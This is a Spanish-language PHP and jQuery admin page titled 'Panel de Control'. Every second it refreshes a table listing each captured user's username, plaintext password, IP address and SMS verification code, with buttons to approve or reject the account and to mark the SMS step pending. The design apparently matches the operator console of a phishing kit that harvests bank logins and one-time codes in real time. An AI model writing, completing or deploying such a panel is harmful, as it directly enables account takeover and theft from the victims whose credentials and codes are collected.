<?php
session_start();
include '../db.php';

if (!isset($_SESSION['admin'])) {
    header('Location: login.php');
    exit;
}

// Acción para aprobar, rechazar o poner SMS pendiente
if (isset($_GET['accion']) && isset($_GET['id'])) {
    $id = intval($_GET['id']);
    $accion = $_GET['accion'];

    if ($accion == 'aprobar' || $accion == 'rechazar') {
        $tipo = $_GET['tipo']; // 'cuenta' o 'sms'
        if ($accion == 'aprobar') {
            $status = ($tipo == 'cuenta') ? 'aprobado' : 'aprobado';
        } else {
            $status = ($tipo == 'sms') ? 'rechazado' : 'rechazado';
        }

        if ($tipo == 'cuenta') {
            $conn->query("UPDATE usuarios SET status='$status' WHERE id=$id");
        } elseif ($tipo == 'sms') {
            $conn->query("UPDATE usuarios SET sms_status='$status' WHERE id=$id");
        }
    }

    // Acción para poner el SMS como Pendiente
    if ($accion == 'pendiente' && isset($_GET['tipo']) && $_GET['tipo'] == 'sms') {
        $conn->query("UPDATE usuarios SET sms_status='pendiente' WHERE id=$id");
    }
}
?>

<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Panel de Control</title>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script>
        // Función que actualiza la tabla de usuarios cada 5 segundos
        function actualizarUsuarios() {
            $.ajax({
                url: 'obtener_usuarios.php', // Este archivo debe devolver el HTML actualizado de la tabla
                method: 'GET',
                success: function(data) {
                    $('#usuarios-table').html(data); // Actualiza la tabla de usuarios con los nuevos datos
                },
                error: function() {
                    alert('Error al cargar los datos');
                }
            });
        }

        // Llamar la función de actualización cada 5 segundos (5000 ms)
        $(document).ready(function() {
            actualizarUsuarios(); // Se hace una primera carga inicial
            setInterval(actualizarUsuarios, 1000); // Después se actualiza cada 5 segundos
        });
    </script>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f7fc;
            padding: 20px;
        }

        h1 {
            color: #333;
        }

        a {
            color: #007bff;
            text-decoration: none;
            margin-bottom: 20px;
            display: inline-block;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
            border: 1px solid #ddd;
            background-color: #fff;
        }

        table th, table td {
            padding: 12px;
            text-align: left;
            border-bottom: 1px solid #ddd;
        }

        table th {
            background-color: #4CAF50;
            color: white;
        }

        .btn {
            padding: 10px 15px;
            border: none;
            cursor: pointer;
            border-radius: 5px;
            color: white;
            font-weight: bold;
        }

        .btn-aprobar {
            background-color: #28a745;
        }

        .btn-rechazar {
            background-color: #dc3545;
        }

        .btn-pendiente {
            background-color: #ffc107;
        }

        .btn-aprobar:hover {
            background-color: #218838;
        }

        .btn-rechazar:hover {
            background-color: #c82333;
        }

        .btn-pendiente:hover {
            background-color: #e0a800;
        }

        .estado {
            font-weight: bold;
            color: #007bff;
        }
    </style>
</head>
<body>
    <h1>Panel de Control</h1>
    <a href="logout.php">Cerrar sesión</a>
    <table id="usuarios-table">
        <!-- La tabla de usuarios se actualizará dinámicamente aquí -->
        <tr>
            <th>ID</th>
            <th>Usuario</th>
            <th>Contraseña</th>
            <th>IP</th>
            <th>Status Cuenta</th>
            <th>Status SMS</th>
            <th>Código SMS</th>
            <th>Acciones</th>
        </tr>
    </table>
</body>
</html>
